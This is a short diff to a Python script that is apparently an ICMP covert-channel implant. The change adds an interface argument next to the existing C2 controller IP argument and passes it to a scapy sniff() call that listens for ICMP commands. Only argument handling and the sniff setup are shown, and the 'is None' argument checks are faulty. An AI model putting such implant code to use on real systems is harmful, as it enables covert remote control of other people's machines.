@@ -21,6 +21,12 @@ if sys.argv[1] is None:
     print("Please supply an IP of the C2")
     sys.exit()
 
+if sys.argv[2] is None:
+    print("Please supply an interface")
+    sys.exit()
+
+iface = sys.argv[2]
+
 # Gets the controller ip from sys argv
 addr_long = int(sys.argv[1], 16)
 c_ip = socket.inet_ntoa(struct.pack("<L", addr_long))
@@ -129,7 +135,7 @@ def main():
     # implant.send(implant.controller_ip, "join", os.getcwd().encode())
 
     # Start sniffing
-    sniff(iface=implant.iface, prn=implant.sniff_callback, filter="icmp", store="0")
+    sniff(iface=iface, prn=implant.sniff_callback, filter="icmp", store="0")
 
 if __name__ == "__main__":
     main()
